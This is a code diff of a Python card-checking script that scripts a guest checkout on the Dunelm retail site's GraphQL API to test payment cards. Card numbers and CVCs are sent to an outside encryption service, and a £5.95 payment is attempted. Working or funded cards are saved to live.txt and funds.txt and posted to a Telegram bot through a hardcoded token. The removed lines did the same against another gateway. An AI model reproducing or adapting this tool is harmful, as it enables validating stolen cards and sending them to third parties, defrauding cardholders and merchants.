+                        'firstName': 'Christa',
+                        'lastName': 'afadf',
+                        'title': 'mrs',
+                        'phoneNumber': '0433656463',
+                        'postcode': 'LE13 9EE',
+                    },
+                    'deliveryOptions': {
+                        'selectedNominatedDates': None,
+                        'selectedStandardUpgradeableOption': 'standard',
+                    },
+                    'marketingPreferences': {
+                        'email': True,
+                    },
+                    'isGuestCheckout': True,
+                },
+            },
+            'query': 'mutation UpdateProvisionalOrder($updateProvisionalOrderDetailsInput: UpdateProvisionalOrderDetailsInput!) {\n  updateProvisionalOrderDetails(input: $updateProvisionalOrderDetailsInput) {\n    provisionalOrderId\n    __typename\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        try:
+            provisional_order_id = re.search(r'"provisionalOrderId":"([\w-]+)"', response.text).group(1)
+        except:
+            pass
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'CheckoutView',
+            'variables': {},
+            'query': 'query CheckoutView {\n  viewer {\n    __typename\n    checkoutProvisionalOrder {\n      __typename\n      ...ProvisionalOrder\n      customer {\n        __typename\n        emailAddress\n        addresses {\n          __typename\n          home {\n            ...Address\n            __typename\n          }\n          billing {\n            ...Address\n            __typename\n          }\n          pudoLocation {\n            ...Address\n            __typename\n          }\n        }\n      }\n    }\n  }\n}\n\nfragment CheckoutOrderline on CheckoutOrderline {\n  skuCode\n  quantity\n  unitPrice\n  totalPrice\n  onOrBy\n  delivered\n  elapsed\n  customerPromiseDate\n  carrier\n  labels\n  quote {\n    __typename\n    quoteId\n  }\n  store {\n    __typename\n    sapSiteId\n    name\n    uri\n    streetAddress\n    localArea\n    city\n    county\n    postcode\n    country\n    phone\n    staticMapUrl\n    ccCheckInType\n    location {\n      __typename\n      lat\n      lon\n    }\n    tillTimes\n    openingHours {\n      __typename\n      day\n      open\n      close\n    }\n    facilities {\n      __typename\n      facilityIcon\n      facility\n    }\n    seoText {\n      __typename\n      facility\n      facilityIcon\n      type\n      text\n      spans {\n        __typename\n        start\n        end\n        type\n      }\n    }\n  }\n  skuDetails {\n    __typename\n    name\n    imageUrl\n    skuDefiningValues\n    productName\n  }\n  customProduct\n  customProperties {\n    madeToMeasure {\n      widthInCentimeters\n      lengthInCentimeters\n      totalMeterage\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          chainColour\n          rollDirection\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          dressSide\n          singlePair\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        chainColour\n        rollDirection\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        dressSide\n        singlePair\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Address on Address {\n  id\n  addressCode\n  lastName\n  city\n  addressType\n  county\n  postcode\n  title\n  firstName\n  phoneNumber\n  countryCode\n  line1\n  line2\n  line3\n  __typename\n}\n\nfragment ProvisionalOrder on CheckoutProvisionalOrder {\n  provisionalOrderId\n  preferredDeliveryMethod\n  expiryDate\n  cc {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    collections {\n      __typename\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n    }\n  }\n  hd {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    deliveries {\n      type\n      onOrBy\n      date\n      fulfilmentType\n      deliveryCharge\n      isDeliveryCallRequired\n      groupId\n      otherOptions {\n        type\n        date\n        deliveryCharge\n        __typename\n      }\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n      __typename\n    }\n    deliveryCharges {\n      type\n      charge\n      __typename\n    }\n  }\n  flags {\n    paymentRequired\n    isDeliveryFree\n    checkoutComplete\n    __typename\n  }\n  voucher {\n    __typename\n    basketDiscount\n    discountedDeliveryCharges {\n      discountedAmount\n      originalCharge\n      type\n      __typename\n    }\n    code\n    description\n  }\n  prices {\n    __typename\n    delivery\n    subtotal\n    orderLinesPayable\n    total\n  }\n  promises {\n    sku\n    available\n    promises {\n      ... on Delivery {\n        __typename\n      }\n      ... on HomeDelivery {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Standard {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on NominatedDay {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Express {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on ClickAndCollect {\n        available\n        stores {\n          sapSiteId\n          availability {\n            sku\n            quantity\n            stock\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'PaymentViewer',
+            'variables': {
+                'isMposAdyen': False,
+                'isLtcBroaderBasket': True,
+            },
+            'query': 'query PaymentViewer($isStepUpRequired: Boolean, $isMposAdyen: Boolean, $isLtcBroaderBasket: Boolean) {\n  viewer {\n    __typename\n    paymentTypes(isStepUpRequired: $isStepUpRequired, isMposAdyen: $isMposAdyen, isLtcBroaderBasket: $isLtcBroaderBasket) {\n      payments {\n        name\n        url\n        payload\n        provider\n        customerOrderId\n        __typename\n      }\n      __typename\n    }\n    checkoutProvisionalOrder {\n      __typename\n      voucher {\n        __typename\n        isValid\n        basketDiscount\n        code\n        description\n        discountedDeliveryCharges {\n          discountedAmount\n          originalCharge\n          type\n          __typename\n        }\n      }\n      stockCheck {\n        __typename\n        result\n      }\n    }\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'customerDetailsByEmailQuery',
+            'variables': {
+                'email': acc,
+            },
+            'query': 'query customerDetailsByEmailQuery($email: String!) {\n  customerDetailsByEmail(email: $email) {\n    knownCustomer\n    __typename\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'AdyenOrder',
+            'variables': {},
+            'query': 'mutation AdyenOrder {\n  adyenOrder {\n    amount {\n      currency\n      value\n      __typename\n    }\n    remainingAmount {\n      currency\n      value\n      __typename\n    }\n    orderData\n    pspReference\n    reference\n    expiresAt\n    resultCode\n    adyenResponse {\n      amount {\n        currency\n        value\n        __typename\n      }\n      remainingAmount {\n        currency\n        value\n        __typename\n      }\n      orderData\n      pspReference\n      reference\n      expiresAt\n      resultCode\n      __typename\n    }\n    __typename\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        try:
+            psp_reference = re.search(r'"pspReference":"([\w-]+)"', response.text).group(1)
+            order_data = re.search(r'"orderData":"([^"]+)"', response.text).group(1)
+        except:
+            pass
+        pubkey = "10001|A9AB882C9833E67E0D8F45715BF0DAFF4D840FF33B08689F24368E4006F8ECD434A992CB9EAB9B9D6CDA98482214F1F4F83018244FD42D94C5F2D36B0DD4C18470D8E69F40C3E6A24FF8422D9DFA439F16585A95613A97CF0F6AFE7BAA6023C29215B9394A040F88D1A795B65D24210A93AC10B5C92AF2619DBCEC742CED708C72AC360702FBE9D832F4054D4C910B9E0B672249387EA295D59DAD670D7D8C8E69EC3755453AC550E1FDA26864D73CB21696389B7E7CFED29C8809AC708B018D5F783C1FE8FC34D898056ECAFE7AB1E540C4FF62A2B77810C2224B8F4E2F93E5355869861E5797D4BF4BEC72DF65AB8DA46F95DA5FFD75997DDFB4FBA5DFE777"
+        card = f"{nn}|{mm}|20{yy}|{cvc}"
+            
+        def adyen_enc(card:str, pubkey:str):
+            try:
+                url=  "https://api.voidex.dev/api/ayden"
+                params = {"card": card, "pubkey": pubkey}
+                resp = requests.get(url, params=params)
+                return resp.json()
+            except Exception as e:
+                return {"error": str(e)}
+            
+            
+        p = (adyen_enc(card, pubkey))
+            #print(p)
+        cv = (p['data']['encryptedSecurityCode'])
+            
+            
+            
+        m = (p['data']['encryptedExpiryMonth'])
+            
+        y = (p['data']['encryptedExpiryYear'])
+            
+            
+        n = (p['data']['encryptedCardNumber'])
+            
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'AdyenPayment',
+            'variables': {
+                'input': {
+                    'paymentMethod': {
+                        'type': 'scheme',
+                        'holderName': f'{first_name} {last_name}',
+                        #'encryptedSecurityCode': cv,
+                        'encryptedCardNumber': n,
+                        'encryptedExpiryMonth': m,
+                        'encryptedExpiryYear': y,
+                        'brand': card_type,
+                    },
+                    'browserInfo': {
+                        'acceptHeader': '*/*',
+                        'colorDepth': 24,
+                        'language': 'ar',
+                        'javaEnabled': False,
+                        'screenHeight': 1080,
+                        'screenWidth': 1920,
+                        'userAgent': ua,
+                        'timeZoneOffset': -120,
+                    },
+                    'idempotencyKey': f'{provisional_order_id}-5.95-scheme',
+                    'amount': {
+                        'value': 595,
+                        'currency': 'GBP',
+                    },
+                    'order': {
+                        'orderData': order_data,
+                        'pspReference': psp_reference,
+                    },
+                    'provisionalOrderId': provisional_order_id,
+                },
+            },
+            'query': 'mutation AdyenPayment($input: AdyenPaymentInput!) {\n  adyenPayment(input: $input) {\n    action {\n      authorisationToken\n      paymentData\n      paymentMethodType\n      subtype\n      token\n      type\n      method\n      url\n      data {\n        MD\n        PaReq\n        TermUrl\n        __typename\n      }\n      sdkData {\n        client_token\n        payment_method_category\n        __typename\n      }\n      __typename\n    }\n    donationToken\n    pspReference\n    refusalReason\n    refusalReasonCode\n    resultCode\n    transaction {\n      transactionType\n      cardType\n      maskedCardNumber\n      paymentMethodVariant\n      amount\n      __typename\n    }\n    order {\n      amount {\n        currency\n        value\n        __typename\n      }\n      orderData\n      pspReference\n      remainingAmount {\n        currency\n        value\n        __typename\n      }\n      reference\n      expiresAt\n      resultCode\n      __typename\n    }\n    __typename\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        try:
+            if "Refused" in response.text:
+                refusal_match = re.search(r'"refusalReason"\s*:\s*"([^"]+)"', response.text)
+                if refusal_match:
+                    msg = refusal_match.group(1)
+                    if msg == "Not enough balance":
+                        msg = "Not enough balance ✅"
+                        with open("funds.txt", "a+") as live_file:
+                            live_file.write(f"{ccx}\n")
+                        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
+                    Not enough balance ✅
+                    
+                    [↯] 𝗖𝗖 ⇾ {ccx} 
+                """)
+                else:
+                    msg = "Unknown refusal reason ❌"
+
+            elif "threeDS2" in response.text:
+                msg = "Challenge Required ❌"
+
+            elif "Authorised" in response.text:
+                msg = "Thank you for your order ✅"
+                with open("live.txt", "a+") as live_file:
+                    live_file.write(f"{ccx}\n")
+                requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                     Charge ✅
                     
                     [↯] 𝗖𝗖 ⇾ {ccx} 
                 """)
-        return 'success'
 
-    elif 'requires_action' in result2:
-        return 'requires_action'
+            elif "Error " in response.text:
+                msg = "Invalid Card ❌"
 
-    elif 'The provided PaymentMethod has failed authentication. You can provide payment_method_data or a new PaymentMethod to attempt to fulfill this PaymentIntent again' in result2:
-        return 'requires_action'
+            else:
+                msg = "Unknown Response ❌"
 
-    elif 'not support this type of purchase' in result2 or 'do_not_honor' in result2:
-        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
-                    Your Card dose Not Support ✅
-                    
-                    [↯] 𝗖𝗖 ⇾ {ccx} 
-                """)
-        return 'not support this type of purchase'
-
-    elif 'insufficient funds' in result2:
-        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
-                    FUNDS ✅
-                    
-                    [↯] 𝗖𝗖 ⇾ {ccx} 
-                """)
-        return 'insufficient funds'
-
-    elif 'security code is incorrect' in result2:
-        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
-                    CCN ✅
-                    
-                    [↯] 𝗖𝗖 ⇾ {ccx} 
-                """)
-        return 'security code is incorrect'
-
-    else:
-        parsed_data = json.loads(response.text)
-        messages = parsed_data.get("messages", "")
-        match = re.search(r"There was an error processing the payment:\s*(.+?)\s*</li>", messages).group(1).strip()
-        return match
+            return msg , ip_data
+        except:
+            pass
+    except Exception as e:
+        pass
